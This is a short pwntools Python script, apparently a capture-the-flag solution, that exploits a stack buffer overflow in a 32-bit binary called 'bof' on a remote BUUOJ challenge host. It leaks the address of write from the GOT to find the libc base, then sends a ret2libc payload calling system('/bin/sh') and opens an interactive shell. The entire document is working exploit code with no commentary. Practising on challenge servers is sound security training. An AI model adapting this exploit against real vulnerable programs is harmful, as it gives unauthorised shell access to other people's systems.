from pwn import *

#p = process('./bof')
p = remote('node4.buuoj.cn', 26409)
elf = ELF('bof')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

vuln_addr = elf.sym['vuln']

write_plt = elf.plt['write']
write_got = elf.got['write']

payload = b'a' * ( 0x6c + 4 ) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)

p.recvuntil('\n')
p.sendline(payload)

libc_base = u32(p.recv(4)) - libc.sym['write']
print('[+] libc_base -> {}'.format(libc_base))

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x6c + 4 ) + p32(system_addr) + p32(0x123) + p32(bin_sh)

p.sendline(payload)

p.interactive()
